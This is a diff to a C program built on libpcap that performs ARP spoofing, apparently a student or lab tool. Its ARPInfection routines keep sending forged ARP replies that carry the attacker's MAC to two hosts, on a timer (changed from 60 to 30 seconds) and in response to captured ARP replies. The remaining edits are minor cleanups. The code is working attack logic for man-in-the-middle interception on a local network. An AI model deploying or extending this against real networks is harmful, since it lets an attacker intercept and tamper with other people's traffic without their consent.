@@ -48,7 +48,7 @@ void printmac(u_char *srcMac)
 		srcMac[3], srcMac[4], srcMac[5]);	
 }
 
-void printip(char *name, u_char *ip)
+void printip(const char *name, u_char *ip)
 {
 	printf("%s: %u.%u.%u.%u\n", name, ip[0], ip[1], ip[2], ip[3]);
 }
@@ -209,11 +209,9 @@ void* ARPInfection_regular(void *pinfo)
 
 	while(true)
 	{
-		SendPacket(handle, info.dst_ip, info.src_ip,
-			info.myMac, info.srcMac, 2, "Regular");
-		SendPacket(handle, info.src_ip, info.dst_ip,
-			info.myMac, info.dstMac, 2, "Regular");
-		sleep(60);
+		SendPacket(handle, info.dst_ip, info.src_ip, info.myMac, info.srcMac, 2, "Regular");
+		SendPacket(handle, info.src_ip, info.dst_ip, info.myMac, info.dstMac, 2, "Regular");
+		sleep(30);
 	}
 
 	pcap_close(handle);
@@ -267,8 +265,6 @@ void* ARPInfection_irregular(void *ainfo)
 
 	    const u_char* packet;
 	    unsigned short eth_type;
-	    u_char srcMac[6];
-	    u_char dstMac[6];
 
 	    int res = pcap_next_ex(handle, &header, &packet);
 	    int flag = 0;
@@ -287,7 +283,7 @@ void* ARPInfection_irregular(void *ainfo)
 	      	if(!memcmp((char*)&(info->all_dst_ip[i]), arp_h->arp_spa, 4) &&
 	      		!memcmp((char*)&(info->all_src_ip[i]), arp_h->arp_tpa, 4) && arp_h->ea_hdr.ar_op == ntohs(0x02)){
 	      		
-	      		sleep(0.5);
+	      		sleep(1);
 
 	      		printf("***********infection*********\n");
 		      	printip("arp_spa", arp_h->arp_spa);
@@ -306,7 +302,7 @@ void* ARPInfection_irregular(void *ainfo)
 	      	else if (!memcmp((char*)&(info->all_src_ip[i]), arp_h->arp_spa, 4) &&
 	      		!memcmp((char*)info->all_dst_ip, arp_h->arp_tpa, 4) && arp_h->ea_hdr.ar_op == ntohs(0x02)){	
 
-	      		sleep(0.5);
+	      		sleep(1);
 
 	      		printf("***********infection*********\n");
 		      	printip("arp_spa", arp_h->arp_spa);
